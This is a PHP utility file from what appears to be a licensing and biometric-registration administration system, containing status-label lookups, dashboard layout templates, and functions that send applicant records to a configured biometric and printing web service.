function legNotificacaoPublicacaoTipo($var){
	$ret = $var;
	$arr["1"] = "Análise de Notificação";
	$arr["2"] = "Decisão";
	$arr["3"] = "Despacho";
	$arr["4"] = "Parecer";
	$arr["5"] = "SMS";
	$arr["6"] = "E-mail";
	if($ret != "array"){ if(isset($arr["$ret"])){ $leg = $arr["$ret"]; }else{ $leg = "Indefinido"; } }else{ $leg = $arr; }
	return $leg;
}//legNotificacaoPublicacaoTipo






//monta legenda de status das tabelas remessa de notificações - legenda remessa de envio de notificação
function legNotificacaoRemessaStatus($var){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "CANCELADO"; }
	if($var == "1"){ $leg = "EM TRAMITAÇÃO"; }
	if($var == "2"){ $leg = "RECEBIDO"; }
	return $leg;
}//legNotificacaoRemessaStatus









//monta legenda de status das denúncias app: com_appdenuncias_ativas, com_appdenuncias_finalizadas
function legAppDenunciasStatus($var){
	$ret = $var;
	//ativo
	$arr["0"] = "CANCELADO";
	$arr["1"] = "AGUARDANDO LEITURA";
	$arr["2"] = "EM PROCESSAMENTO";
	$arr["3"] = "EM AVERIGUAÇÃO";
	$arr["4"] = "EM SOLUÇÃO";
	$arr["5"] = "TRABALHOS EM EXECUÇÃO";
	//finalizado
	$arr["10"] = "FINALIZADO/CONCLUÍDO";
	$arr["11"] = "NÃO FOI CONFIRMADO";
	$arr["12"] = "ENVIADO AO RESPONSÁVEL";
	if($ret != "array"){ if(isset($arr["$ret"])){ $leg = $arr["$ret"]; }else{ $leg = "Indefinido"; } }else{ $leg = $arr; }
	return $leg;
}//legAppDenunciasStatus









//monta legenda de status das verificações de registro cidadão app: com_registrocidadao_verificacao
function legAppVerificacaoStatus($var){
	$ret = $var;
	//ativo
	$arr["0"] = "NEGADO";
	$arr["1"] = "ACEITO";
	$arr["2"] = "AGUARDANDO VERIFICAÇÃO";
	$arr["3"] = "SUBSTITUÍDO";
	$arr["4"] = "DUPLICADO";
	$arr["5"] = "REVOGADO";
	if($ret != "array"){ if(isset($arr["$ret"])){ $leg = $arr["$ret"]; }else{ $leg = "Indefinido"; } }else{ $leg = $arr; }
	return $leg;
}//legAppVerificacaoStatus






//monta legenda de status da tabela de fin_conta_retorno
function legContaRetorno($var){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "CANCELADO"; }
	if($var == "1"){ $leg = "EM PROCESSAMENTO"; }
	if($var == "2"){ $leg = "AGUARDANDO AÇÃO"; }
	if($var == "3"){ $leg = "PROCESSAMENTO CONCLUIDO"; }
	return $leg;
}//legContaRetorno















//monta icone de cores de sinal verde, amarelo e vermelho
function icoSinalAV($tm,$valor,$amarelo='1',$vermelho='2'){
	$cor = "0C0"; $leg = "Em atividade"; $valor = "$valor";
	if($tm == "P"){ $tm = "10"; } if($tm == "M"){ $tm = "20"; } if($tm == "G"){ $tm = "40"; }
	if($valor >= $amarelo){ $cor = "FF0"; $leg = "Utrapassou ".$amarelo."º dia"; }
	if($valor >= $vermelho){ $cor = "F00"; $leg = "Utrapassou ".$vermelho."º dia"; } 
	if($valor == "INC"){ $cor = "999"; $leg = "Está encubado"; }
	if($valor == "ARQ"){ $cor = "06F"; $leg = "Está arquivado"; }
	$leg = icoCicle($tm,$cor,'rel="tooltip" data-placement="right" title="'.$leg.'"');
	return $leg;
}//icoSinalAV





//monta nome/legenda de cores de sinal verde, amarelo e vermelho
function legSinalAV($valor,$amarelo='1',$vermelho='2'){
	$cor = "VERDE"; $valor = "$valor";
	if($valor >= $amarelo){ $cor = "AMARELO"; }
	if($valor >= $vermelho){ $cor = "VERMELHO"; } 
	if($valor == "INC"){ $cor = "INCUBADO"; }
	if($valor == "ARQ"){ $cor = "ARQUIVADO"; }
	return $cor;
}//legSinalAV




//monta cor # de cores de sinal verde, amarelo e vermelho
function corSinalAV($valor,$amarelo='1',$vermelho='2'){
	$cor = "0C0"; $valor = "$valor";
	if($valor >= $amarelo){ $cor = "FF0"; }
	if($valor >= $vermelho){ $cor = "F00"; } 
	if($valor == "INC"){ $cor = "999"; }
	if($valor == "ARQ"){ $cor = "06F"; }
	return $cor;
}//corSinalAV




//monta legenda de faisher include
function legFaisher($faisher){
	$leg = "Tela inicial";
	$cont = "0";
	$resu1 = fSQL::SQL_SELECT_SIMPLES("titulo", "sys_menu_files", "include = '$faisher' ", "");
	while($linha1 = fSQL::FETCH_ASSOC($resu1)){
		$leg = $linha1["titulo"];
		$cont++;
	}//
	if($cont == "0"){
		if($faisher == "uplo"){ $leg = "Upload de arquivo"; }
		if($faisher == "expo"){ $leg = "Exportar dados"; }
		if($faisher == "duam"){ $leg = "Emissão de DUAM"; }
		if($faisher == "log"){ $leg = "Log de registro"; }
		if($faisher == "shot"){ $leg = "Captura de imagem"; }
		if($faisher == "senh"){ $leg = "Senha pessoal"; }
		if($faisher == "down"){ $leg = "Download de dados"; }
		if($faisher == "perfil"){ $leg = "Alternar perfil"; }
		if($faisher == "bloqueio"){ $leg = "Tela de bloqueio"; }
	}
	return $leg;
}//legFaisher









//retorno de legendas webservice
function legAcaoWebservice($var,$acao="id"){
	if($acao == "id"){//retorna o número de referencia da tabela ao web service
		if($var == "idoc_sys_webservice_integrado"){ $leg = "integrado"; }
		if($var == "sys_webservice_dados"){ $leg = "dados"; }
	}
	if($acao == "tab"){//retorna o nome da tabela
		if($var == "1"){ $leg = "idoc_sys_webservice_integrado"; }
		if($var == "2"){ $leg = "sys_webservice_dados"; }
	}
	if($acao == "leg"){//retorna a legenda da tabela ao web service
		if(($var == "idoc_sys_webservice_integrado") or ($var == "1")){ $leg = "Web Service SIGPC"; }
		if(($var == "sys_webservice_dados") or ($var == "2")){ $leg = "Web Service SIGPC"; }
	}
	return $leg;
}//legAcaoWebservice









//retorno de legendas webservice
function legTabelasWebservice($var,$acao="id"){
	if($acao == "id"){//retorna o número de referencia da tabela ao web service
		if($var == "sys_smsgateway"){ 	$leg = "1"; }
		if($var == "sys_ws_portal_rm"){ $leg = "2"; }
	}
	if($acao == "tab"){//retorna o nome da tabela
		if($var == "1"){ $leg = "sys_smsgateway"; }
		if($var == "2"){ $leg = "sys_ws_portal_rm"; }
	}
	if($acao == "leg"){//retorna a legenda da tabela ao web service
		if(($var == "sys_smsgateway") or ($var == "1")){ $leg = "Gateway de Envios SMS"; }
		if(($var == "sys_ws_portal_rm") or ($var == "2")){ $leg = "Web Service Portal ".SYS_CONFIG_RM_SIGLA; }
	}
	return $leg;
}//legTabelasWebservice





//monta cor de sync web service
function legCorSyncWebservice($time_d){
	$dif = time()-$time_d;
	$time_d_class = "danger";
	if($dif < "1800"){ $time_d_class = "success"; }
	if($dif > "1800"){ $time_d_class = "warning"; }
	if($dif > "7200"){ $time_d_class = "danger"; }
	return $time_d_class;
}//legCorSyncWebservice
























//retorno de leyouts para TV gestão
function layoutTVGestao($numero,$acao="leg",$c_img="img/"){
	$htmlRet = "LAYOUT INDIFINIDO";
	if($numero == "1"){//retorna o layout selecionado
		$htmlRet = '<table width="100%" border="0" align="center" cellpadding="0" cellspacing="2" style="width:100%; height:100%;">
						<tr>
							<td align="center" valign="middle" style="background:#0F6;">[A]</td>
						</tr>
					</table>';
	}//if($numero == "1"){
	if($numero == "2"){//retorna o layout selecionado
		$htmlRet = '<table width="100%" border="0" align="center" cellpadding="0" cellspacing="2" style="width:100%; height:100%;">
						<tr>
							<td align="center" valign="middle" style="background:#0F6;">[A]</td>
						</tr>
						<tr>
							<td align="center" valign="middle" style="background:#3CF;">[B]</td>
						</tr>
					</table>';
	}//if($numero == "2"){
	if($numero == "3"){//retorna o layout selecionado
		$htmlRet = '<table width="100%" border="0" align="center" cellpadding="0" cellspacing="2" style="width:100%; height:100%;">
						<tr>
							<td width="50%" align="center" valign="middle" style="background:#0F6;">[A]</td>
							<td width="50%" align="center" valign="middle" style="background:#3CF;">[B]</td>
						</tr>
					</table>';
	}//if($numero == "3"){
	if($numero == "4"){//retorna o layout selecionado
		$htmlRet = '<table width="100%" border="0" align="center" cellpadding="0" cellspacing="2" style="width:100%; height:100%;">
						<tr>
							<td width="50%" align="center" valign="middle" style="background:#3CF;">[A]</td>
							<td width="50%" align="center" valign="middle" style="background:#0F6;">[B]</td>
						</tr>
						<tr>
							<td align="center" valign="middle" style="background:#0F6;">[C]</td>
							<td align="center" valign="middle" style="background:#3CF;">[D]</td>
						</tr>
					</table>';
	}//if($numero == "4"){
	if($numero == "5"){//retorna o layout selecionado
		$htmlRet = '<table width="100%" border="0" align="center" cellpadding="0" cellspacing="2" style="width:100%; height:100%;">
						<tr>
							<td width="34%" align="center" valign="middle" style="background:#0F6;">[A]</td>
							<td width="33%" align="center" valign="middle" style="background:#3CF;">[B]</td>
							<td width="33%" align="center" valign="middle" style="background:#0F6;">[C]</td>
						</tr>
						<tr>
							<td align="center" valign="middle" style="background:#3CF;">[D]</td>
							<td align="center" valign="middle" style="background:#0F6;">[E]</td>
							<td align="center" valign="middle" style="background:#3CF;">[F]</td>
						</tr>
					</table>';
	}//if($numero == "5"){
	
	if($acao == "leg"){
		$htmlRet = '<div style="background:url('.$c_img.'tv-gestao-logo.png) no-repeat center; background-size:100%; width:144px; height:115px;">
						<div style="padding:8px;"><div style="background:#FFF; height:80px;">
							'.$htmlRet.'
						</div></div>
					</div>';
	}//if($acao == "leg"){
	return $htmlRet;
}//layoutTVGestao






function categoriaServicoArr($tipo_pessoa = ""){
	if($tipo_pessoa == "" || $tipo_pessoa == "fisico"){
		$ARR = array("habilitacao","veiculo","credenciamento","info");
	}else{//if($tipo_pessoa == "" || $tipo_pessoa == "fisico"){
		$ARR = array("veiculo","credenciamento","info");
	}//}else{//if($tipo_pessoa == "" || $tipo_pessoa == "fisico"){
	return $ARR;
}//categoriaServicoArr

function categoriaServicoLeg($tipo){
	$leg = "";
	if($tipo == "habilitacao"){ $leg = "Habilitação"; }
	if($tipo == "veiculo"){ $leg = "Veículo"; }	
	if($tipo == "credenciamento"){ $leg = "Credenciamento"; }		
	if($tipo == "info"){ $leg = "Informações/Retirada"; }			
	return $leg;
}//categoriaServicoLeg

function categoriaServicoIco($tipo){
	$icon = "";
	if($tipo == "habilitacao"){ $icon = "glyphicon-vcard"; }
	if($tipo == "veiculo"){ $icon = "glyphicon-car"; }	
	if($tipo == "credenciamento"){ $icon = "icon-pencil"; }		
	if($tipo == "info"){ $icon = "icon-info-sign"; }			
	return $icon;
}//categoriaServicoIco


function processoStatusLeg($status){
	$leg = "";
	if($status == "0"){ $leg = "EM ATENDIMENTO"; }
	if($status == "1"){ $leg = "EM COLETA"; }	
	if($status == "2"){ $leg = "COLETA REALIZADA"; }	
	if($status == "3"){ $leg = "EM IMPRESSÃO"; }	
	if($status == "4"){ $leg = "IMPRESSO"; }	
	if($status == "5"){ $leg = "ATIVO"; }	
	if($status == "6"){ $leg = "CANCELADO"; }	
	if($status == "7"){ $leg = "COLETA RECUSADA"; }		
	if($status == "8"){ $leg = "IMPRESSÃO CANCELADA"; }		
	if($status == "9"){ $leg = "VENCIDO"; }		
	if($status == "10"){ $leg = "SUSPENSO"; }			
	if($status == "11"){ $leg = "DEDUPLICAÇÃO"; }				
	return $leg;
}//processoStatusLeg


function processoTipoProcesso($servico_id){
	$cod = "";
	if($servico_id == "13"){ $cod = (int)"1"; }//1º habilitação
	if($servico_id == "14"){ $cod = (int)"1"; }//1º habilitação
	if($servico_id == "15"){ $cod = (int)"2"; }//2º via
	//--->renovação
	if($servico_id == "17"){ $cod = (int)"4"; }//mudança de categoria	
	return $cod;
}//processoTipoProcesso



function docPessoaFisica($candidato_id){
	$ARR = array();
	$campos = "nacionalidade,rg,rg_data,passaporte,passaporte_data,passaporte_pais,outro_doc_nome,outro_doc_numero,id_estrangeiro,id_estrangeiro_data";
	$linha2 = fSQL::SQL_SELECT_ONE($campos,"cad_candidato_fisico","id = '$candidato_id'");

	if($linha2["rg"] != "" and $linha2["rg_data"] != ""){ 
		$ARR["doc"] = "1";
		$ARR["nome"] = "identidade";		
		$ARR["numero"] = $linha2["rg"];		
		$ARR["data_emissao"] = $linha2["rg_data"];		
		$ARR["pais"] = $linha2["nacionalidade"];		
	}//if($linha2["rg"] != "" and $linha2["rg_data"] != ""){ 
	
	if($ARR["doc"] == ""){
		if(($linha2["passaporte"] != "") and ($linha2["passaporte_data"] != "") and ($linha2["passaporte_pais"] != "")){
			$ARR["doc"] = "2";
			$ARR["nome"] = "passaporte";
			$ARR["numero"] = $linha2["passaporte"];		
			$ARR["data_emissao"] = $linha2["passaporte_data"];		
			$ARR["pais"] = $linha2["passaporte_pais"];					
		}//if(($linha2["passaporte"] != "") and ($linha2["passaporte_data"] != "") and ($linha2["passaporte_pais"] != "")){
	}//if($documento == ""){
		
	if($ARR["doc"] == ""){
		if(($linha2["id_estrangeiro"] != "") and ($linha2["id_estrangeiro_data"] != "")){
			$ARR["doc"] = "3";
			$ARR["nome"] = "ID Estrangeiro";
			$ARR["numero"] = $linha2["id_estrangeiro"];		
			$ARR["data_emissao"] = $linha2["id_estrangeiro_data"];		
			$ARR["pais"] = $linha2["nacionalidade"];					
		}//if(($linha2["passaporte"] != "") and ($linha2["passaporte_data"] != "") and ($linha2["passaporte_pais"] != "")){
	}//if($documento == ""){
		
	if($ARR["doc"] == ""){
		if(($linha2["outro_doc_nome"] != "") and ($linha2["outro_doc_numero"] != "")){
			$ARR["doc"] = "4";
			$ARR["nome"] = $linha2["outro_doc_nome"];
			$ARR["numero"] = $linha2["outro_doc_numero"];		
			$ARR["data_emissao"] = "";		
			$ARR["pais"] = $linha2["nacionalidade"];					
		}//if(($linha2["passaporte"] != "") and ($linha2["passaporte_data"] != "") and ($linha2["passaporte_pais"] != "")){
	}//if($documento == ""){		
	
	return $ARR;
}//docPessoaFisica


function thomasWS($metodo, $url, $dados){
	$url = $url.$metodo;
	$jsonString = json_encode($dados);
	//echo "<br>url:".$url;
	//echo "<br>json:".$jsonString;
	/*
	$opts = array(
		'http'=>array('header'=>"Content-type: application/json", 'method'=>'POST', 'content'=>$jsonString),
		  "ssl"=>array(
				"verify_peer"=>false,
				"verify_peer_name"=>false
		  )
	);
	$context = stream_context_create($opts);
	$contentsBin = file_get_contents($url, null, $context);		
	*/
	
	// Prepare new cURL resource
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLINFO_HEADER_OUT, true);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonString);
	// Set HTTP Header for POST request 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'Content-Type: application/json',
		'Content-Length: ' . strlen($jsonString))
	);
	// Submit the POST request
	$contentsBin = curl_exec($ch);
	// Close cURL session handle
	curl_close($ch);	
	
	return json_decode($contentsBin, true);
}//enviarWS

function thomasCodRetorno($cod){
	$leg = "";
	if($cod == "1"){ $leg = "Processado"; }
	if($cod == "2"){ $leg = "Falha no Processamento"; }
	if($cod == "3"){ $leg = "Dados Incompletos"; }
	if($cod == "4"){ $leg = "Impresso"; }
	if($cod == "5"){ $leg = "Falha na Impressão"; }
	if($cod == "6"){ $leg = "Informação Desalinhada"; }
	return $leg;
}//thomasCodRetorno



function thomasWScoletaBiometricaEnviar($processo_id,$origem_id){
	$linha = fSQL::SQL_SELECT_ONE("code,servico_id,candidato_fisico_id,candidato_juridico_id,motivo_id","axl_processo","id = '".$processo_id."'");
	$code_a = $linha["code"];
	$servico_id_a = $linha["servico_id"];	
	$candidato_fisico_id_a = $linha["candidato_fisico_id"];
	$candidato_juridico_id_a = $linha["candidato_juridico_id"];		
	$motivo_id_a = $linha["motivo_id"];

	$linha = fSQL::SQL_SELECT_ONE("valor","axl_processo_campos","processo_id = '".$processo_id."' AND tipo_id = '3'");//COLETA BIOMÉTRICA
	$tipo_coleta_a = $linha["valor"];
	
	//WS GRÁFICA ++++++++++++++++++++++++++++++++++++++++++++
	$tipo_processo = processoTipoProcesso($servico_id_a);
	//tipo de coleta 
	if($tipo_coleta_a == "PAPELETA"){ $tipo_coleta_a = "1"; }
	if($tipo_coleta_a == "DIGITAL"){ $tipo_coleta_a = "2"; }

	if($candidato_fisico_id_a >= ""){ 
		$campos = "code,nome,sobrenome,sexo,mae,pai,datan,nacionalidade,localn";
		$linha2 = fSQL::SQL_SELECT_ONE($campos,"cad_candidato_fisico","id = '$candidato_fisico_id_a'");
	}//if($candidato_fisico_id_a >= ""){ 
	//pegar dados de documento do fisico
	$arrDoc = docPessoaFisica($candidato_fisico_id_a);

	unset($arrDados); $arrDados = array();
	$arrDados["numero_rnt"] = $linha2["code"];
	$arrDados["numero_processo"] = $code_a;
	$arrDados["id_origem"] = (int)$origem_id;	
	$arrDados["tipo_processo"] = (int)$tipo_processo;
	$arrDados["tipo_coleta"] = (int)$tipo_coleta_a;
	$arrDados["nome"] = $linha2["nome"];		
	$arrDados["sobrenome"] = $linha2["sobrenome"];		
	$arrDados["sexo"] = (int)$linha2["sexo"];				
	$arrDados["nome_mae"] = $linha2["mae"];				
	$arrDados["nome_pai"] = $linha2["pai"];				
	$arrDados["nacionalidade"] = $linha2["nacionalidade"];				
	$arrDados["local_nascimento"] = $linha2["localn"];						
	$arrDados["data_nascimento"] = data_mysql($linha2["datan"]);
	$arrDados["doc_tipo"] = (int)$arrDoc["doc"];				
	$arrDados["doc_nome"] = $arrDoc["nome"];					
	$arrDados["doc_numero"] = $arrDoc["numero"];						
	$arrDados["doc_data_emissao"] = $arrDoc["data_emissao"];						
	$arrDados["doc_pais"] = $arrDoc["pais"];						
	//echo "VARS: <pre>"; print_r($arrDados); echo "</pre>";
	$result = thomasWS("gravarAutorizacaoColeta",WS_URL_BIOMETRIA,$arrDados);
	//echo "result: <pre>"; print_r($result); echo "</pre>";		
	//atualizar processo
	if($result["codigo_retorno"] == "1"){ 
		fSQL::SQL_UPDATE_SIMPLES("status,sync,motivo_id","axl_processo",array("1",time(),"0"),"id = '".$processo_id."'");
		if($motivo_id_a >= "1"){
			fSQL::SQL_UPDATE_SIMPLES("resolvido,user_a,sync","axl_motivo_cancelamento",array("1",time(),$cVLogin->userReg(),time()),"id = '".$motivo_id_a."'");	
		}//if($motivo_id_a >= "1"){
	}//if($result["codigo_retorno"] == "1"){ 
	
	return $result;	
}//thomasWScoletaBiometricaEnviar






function thomasWSimpressaoEnviar($processo_id,$origem_id){
	$linha = fSQL::SQL_SELECT_ONE("code,servico_id,candidato_fisico_id,candidato_juridico_id,motivo_id,validade_time","axl_processo","id = '".$processo_id."'");
	$code_a = $linha["code"];
	$servico_id_a = $linha["servico_id"];	
	$candidato_fisico_id_a = $linha["candidato_fisico_id"];
	$candidato_juridico_id_a = $linha["candidato_juridico_id"];		
	$motivo_id_a = $linha["motivo_id"];
	$validade_time_a = $linha["validade_time"];	

	$linha = fSQL::SQL_SELECT_ONE("valor","axl_processo_campos","processo_id = '".$processo_id."' AND tipo_id = '3'");//COLETA BIOMÉTRICA
	$tipo_coleta_a = $linha["valor"];

	$tipo_coleta_a = ""; $categorias = ""; $restricoes = "";
	$resu = fSQL::SQL_SELECT_SIMPLES("tipo_id,tipo_campo,nome,valor","axl_processo_campos","processo_id = '".$processo_id."'");
	while($linha = fSQL::FETCH_ASSOC($resu)){
		if($linha["tipo_id"] == "3"){ $tipo_coleta_a = $linha["valor"]; }//TIPO COLETA BIOMÉTRICA
		
		if($linha["tipo_campo"] == "99"){//CATEGORIAS
			if($categorias != ""){ $categorias .= ","; }
			$categorias .= '{"categoria":"'.$linha["nome"].'", "data_aquisicao":"'.$linha["valor"].'"}';
		}//if($linha["tipo_campo"] == "99"){//CATEGORIAS
		
		if($linha["tipo_campo"] == "80"){//RESTRIÇÕES MÉDICAS
			$restricoes = $linha["valor"];
		}//if($linha["tipo_campo"] == "80"){//RESTRIÇÕES MÉDICAS
	}//fim while
	
	if($categorias != ""){ $categorias = "[".$categorias."]"; }
	
	//pegar primeira habilitação -> vencida ou ativa
	$linha = fSQL::SQL_SELECT_ONE("time","axl_processo","candidato_fisico_id = '$candidato_fisico_id_a' AND status IN ('9','5') ORDER BY time ASC");
	$primeira_habilitacao_data = $linha["time"];
	if($primeira_habilitacao_data >= "1"){ $primeira_habilitacao_data = date("Y-m-d", $primeira_habilitacao_data); }
	
	$tipo_processo = processoTipoProcesso($servico_id_a);
	//tipo de coleta 
	if($tipo_coleta_a == "PAPELETA"){ $tipo_coleta_a = "1"; }
	if($tipo_coleta_a == "DIGITAL"){ $tipo_coleta_a = "2"; }

	if($candidato_fisico_id_a >= ""){ 
		$campos = "code,nome,sobrenome,sexo,mae,pai,datan,nacionalidade,localn,grupo_sanguineo";
		$linha2 = fSQL::SQL_SELECT_ONE($campos,"cad_candidato_fisico","id = '$candidato_fisico_id_a'");
	}//if($candidato_fisico_id_a >= ""){ 
	
	//pegar dados de documento do fisico
	$arrDoc = docPessoaFisica($candidato_fisico_id_a);

	unset($arrDados); $arrDados = array();
	$arrDados["numero_rnt"] = $linha2["code"];
	$arrDados["numero_processo"] = $code_a;
	$arrDados["id_origem"] = (int)$origem_id;
	$arrDados["tipo_processo"] = (int)$tipo_processo;
	$arrDados["tipo_coleta"] = (int)$tipo_coleta_a;
	$arrDados["nome"] = $linha2["nome"];		
	$arrDados["sobrenome"] = $linha2["sobrenome"];		
	$arrDados["sexo"] = (int)$linha2["sexo"];				
	$arrDados["nome_mae"] = $linha2["mae"];				
	$arrDados["nome_pai"] = $linha2["pai"];				
	$arrDados["nacionalidade"] = $linha2["nacionalidade"];				
	$arrDados["local_nascimento"] = $linha2["localn"];						
	$arrDados["data_nascimento"] = data_mysql($linha2["datan"]);
	$arrDados["doc_tipo"] = (int)$arrDoc["doc"];				
	$arrDados["doc_nome"] = $arrDoc["nome"];					
	$arrDados["doc_numero"] = $arrDoc["numero"];						
	$arrDados["doc_data_emissao"] = $arrDoc["data_emissao"];						
	$arrDados["doc_pais"] = $arrDoc["pais"];						
	$arrDados["tipo_sanguineo"] = $linha2["grupo_sanguineo"];
	$arrDados["data_primeira_habilitacao"] = $primeira_habilitacao_data;
	$arrDados["data_validade"] = date("Y-m-d",$linha2["validade_time"]);
	$arrDados["uf_habilitacao"] = "GN";	
	$arrDados["categorias"] = $categorias;		
	$arrDados["restricoes"] = $restricoes;		
	$result = thomasWS("gravarAutorizacaoEmissaoDocumento",WS_URL_BIOMETRIA,$arrDados);
	echo "result: <pre>"; print_r($result); echo "</pre>";		
	//atualizar processo
	if($result["codigo_retorno"] == "1"){ 
		fSQL::SQL_UPDATE_SIMPLES("status,sync,motivo_id","axl_processo",array("3",time(),"0"),"id = '".$processo_id."'");
	}//if($result["codigo_retorno"] == "1"){ 
	
	return $result;	
}//thomasWSenviarColetaBiometrica








function thomasWScoletaBiometricaCancelar($processo_id,$origem_id,$motivo_cancelamento=""){
	$linha = fSQL::SQL_SELECT_ONE("code,candidato_fisico_id,candidato_juridico_id","axl_processo","id = '".$processo_id."'");
	$code_a = $linha["code"];
	$candidato_fisico_id_a = $linha["candidato_fisico_id"];
	$candidato_juridico_id_a = $linha["candidato_juridico_id"];		

	//WS GRÁFICA ++++++++++++++++++++++++++++++++++++++++++++

	if($candidato_fisico_id_a >= ""){ 
		$campos = "code";
		$linha2 = fSQL::SQL_SELECT_ONE($campos,"cad_candidato_fisico","id = '$candidato_fisico_id_a'");
	}//if($candidato_fisico_id_a >= ""){ 

	unset($arrDados); $arrDados = array();
	$arrDados["numero_rnt"] = $linha2["code"];
	$arrDados["numero_processo"] = $code_a;
	$arrDados["id_origem"] = (int)$origem_id;
	$arrDados["codigo_motivo"] = (int)"2";
	$arrDados["motivo_cancelamento"] = $motivo_cancelamento;	
	$result = thomasWS("cancelarAutorizacaoColeta",WS_URL_BIOMETRIA,$arrDados);
	
	//atualizar processo
	if($result["codigo_retorno"] == "1"){ 
		fSQL::SQL_UPDATE_SIMPLES("status,sync,obs_geral","axl_processo",array("7",time(),$motivo_cancelamento),"id = '".$processo_id."'");
	}//if($result["codigo_retorno"] == "1"){ 
	
	return $result;	
}//thomasWScoletaBiometricaCancelar










function thomasWSimpressaoCancelar($processo_id,$origem_id,$motivo_cancelamento=""){
	$linha = fSQL::SQL_SELECT_ONE("code,candidato_fisico_id,candidato_juridico_id","axl_processo","id = '".$processo_id."'");
	$code_a = $linha["code"];
	$candidato_fisico_id_a = $linha["candidato_fisico_id"];
	$candidato_juridico_id_a = $linha["candidato_juridico_id"];		

	//WS GRÁFICA ++++++++++++++++++++++++++++++++++++++++++++

	if($candidato_fisico_id_a >= ""){ 
		$campos = "code";
		$linha2 = fSQL::SQL_SELECT_ONE($campos,"cad_candidato_fisico","id = '$candidato_fisico_id_a'");
	}//if($candidato_fisico_id_a >= ""){ 

	unset($arrDados); $arrDados = array();
	$arrDados["numero_rnt"] = $linha2["code"];
	$arrDados["numero_processo"] = $code_a;
	$arrDados["id_origem"] = (int)$origem_id;
	$arrDados["codigo_motivo"] = (int)"2";
	$arrDados["motivo_cancelamento"] = $motivo_cancelamento;	
	$result = thomasWS("cancelarAutorizacaoEmissaoDocumento",WS_URL_BIOMETRIA,$arrDados);
	
	//atualizar processo
	if($result["codigo_retorno"] == "1"){ 
		fSQL::SQL_UPDATE_SIMPLES("status,sync,obs_geral","axl_processo",array("8",time(),$motivo_cancelamento),"id = '".$processo_id."'");
	}//if($result["codigo_retorno"] == "1"){ 
	
	return $result;	
}//thomasWScoletaBiometricaCancelar









function legDedo($posicao){
	$leg = "";
	if($posicao == "1"){ $leg = "Polegar"; }
	elseif($posicao == "2"){ $leg = "Indicador"; }
	elseif($posicao == "3"){ $leg = "Médio"; }
	elseif($posicao == "4"){ $leg = "Anular"; }
	elseif($posicao == "5"){ $leg = "Mínimo"; }
	elseif($posicao == "6"){ $leg = "Polegar"; }
	elseif($posicao == "7"){ $leg = "Indicador"; }	
	elseif($posicao == "8"){ $leg = "Médio"; }	
	elseif($posicao == "9"){ $leg = "Anular"; }
	elseif($posicao == "10"){ $leg = "Mínimo"; }		
	
	return $leg;
}//legDedo


function soNumero($str) {
    return preg_replace("/[^0-9]/", "", $str);
}

// FIM FUNÇÕES DO SISTEMA -----------------##############@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<<<<<<<<<<<<<<<<<<<<<
?>
